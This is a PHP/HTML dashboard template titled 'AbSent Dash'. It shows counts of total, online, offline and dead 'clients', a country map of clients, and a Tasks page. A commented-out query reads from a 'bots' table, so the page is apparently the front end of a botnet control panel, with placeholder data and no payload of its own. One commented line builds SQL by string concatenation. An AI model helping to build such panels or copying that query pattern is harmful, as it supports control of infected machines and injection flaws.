<?php
//include '../include/session.php';
//include '../include/geo.php';
//include '../include/stats.php';
//$userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);
?>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>AbSent Dash</title>
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300,100,700,900' rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- inject:css -->
    <link rel="stylesheet" href="../css/lib/getmdl-select.min.css">
    <link rel="stylesheet" href="../css/lib/nv.d3.css">
    <link rel="stylesheet" href="../css/application.css">
    <!-- endinject -->
    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
    <script type="text/javascript">
        google.charts.load('current', {
            'packages':['geochart', 'corechart']
            });
        google.charts.setOnLoadCallback(drawRegionsMap);
        function drawRegionsMap() {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Clients'],
                ['Germany', 200],
                ['United States', 300],
                ['Brazil', 400],
                ['Canada', 500],
                ['France', 600],
                ['RU', 700]
                <?php
                //$csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt");
                //while ($c = $csel->fetch())
                //{
                //    echo '[\'' . countryCodeToCountry($c[0]) . '\',';
                //    echo $c[1] . '],' . PHP_EOL;
                //}
                ?>
            ]);
            var options = {
                backgroundColor: '#4e4e4e',
                colorAxis: {colors: ['white', '#00bcd4']},
            };
            var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));
            chart.draw(data, options);
        }
    </script>
</head>
<body>
<div class="mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header is-small-screen">
    <header class="mdl-layout__header">
        <div class="mdl-layout__header-row">
            <div class="mdl-layout-spacer"></div>

            <div class="avatar-dropdown" id="icon">
                <span>$username</span>
                <img src="../images/avatar.png">
            </div>

            <!-- Account dropdawn-->
            <ul class="mdl-menu mdl-list mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect mdl-shadow--2dp account-dropdown"
                for="icon">
                <li class="mdl-list__item mdl-list__item--two-line">
                    <span class="mdl-list__item-primary-content">
                        <span>$username</span>
                        <span class="mdl-list__item-sub-title">$userperms</span>
                    </span>
                </li>
                <li class="list__item--border-top"></li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="account.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">account_circle</i>
                        My account
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="settings.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">settings</i>
                       Settings
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="logout.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">exit_to_app</i>
                        Logout
                    </a>
                </li>
                
        </div>
    </header>

    <div class="mdl-layout__drawer">
        <header>AbSent</header>
        <nav class="mdl-navigation">
            <a class="mdl-navigation__link mdl-navigation__link--current" href="index.php">
                <i class="material-icons" role="presentation">dashboard</i>
                Dashboard
            </a>
            <a class="mdl-navigation__link" href="statistics.php">
                <i class="material-icons" role="presentation">show_chart</i>
                Statistics
            </a>
            <a class="mdl-navigation__link" href="clients.php">
                <i class="material-icons" role="presentation">person</i>
                Clients
            </a>
            <a class="mdl-navigation__link" href="tasks.php">
                <i class="material-icons" role="presentation">map</i>
                Tasks
            </a>
        </nav>
    </div>
    <main class="mdl-layout__content">
        <div class="mdl-grid">

                <div class="mdl-cell mdl-cell--3-col">
                    <div class="mdl-card mdl-shadow--2dp">
                        <div class="mdl-card__title">
                            <h2 class="mdl-card__title-text">Total</h2>
                        </div>
                        <div class="mdl-card__supporting-text">
                            <div class="">
                                <center><h1>$total</h1></center>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mdl-cell mdl-cell--3-col">
                    <div class="mdl-card mdl-shadow--2dp">
                        <div class="mdl-card__title">
                            <h2 class="mdl-card__title-text">Online</h2>
                        </div>
                        <div class="mdl-card__supporting-text">
                            <div class="">
                                <center><h1>$online</h1></center>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mdl-cell mdl-cell--3-col">
                    <div class="mdl-card mdl-shadow--2dp">
                        <div class="mdl-card__title">
                            <h2 class="mdl-card__title-text">Offline</h2>
                        </div>
                        <div class="mdl-card__supporting-text">
                            <div class="">
                                <center><h1>$offline</h1></center>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mdl-cell mdl-cell--3-col">
                    <div class="mdl-card mdl-shadow--2dp">
                        <div class="mdl-card__title">
                            <h2 class="mdl-card__title-text">Dead</h2>
                        </div>
                        <div class="mdl-card__supporting-text">
                            <div class="">
                                <center><h1>$dead</h1></center>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mdl-cell mdl-cell--12-col">
                    <div class="mdl-card mdl-shadow--2dp">
                        <div class="mdl-card__title">
                            <h2 class="mdl-card__title-text">Client Map</h2>
                        </div>
                        <div class="mdl-card__supporting-text">
                            <div class="" id="regions_div" style="width: 1500px; height: 700px;">

                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>

    </main>
</div>

<!-- inject:js -->
<script src="../js/d3.js"></script>
<script src="../js/getmdl-select.min.js"></script>
<script src="../js/material.js"></script>
<script src="../js/nv.d3.js"></script>
<!-- endinject -->

</body>
</html>
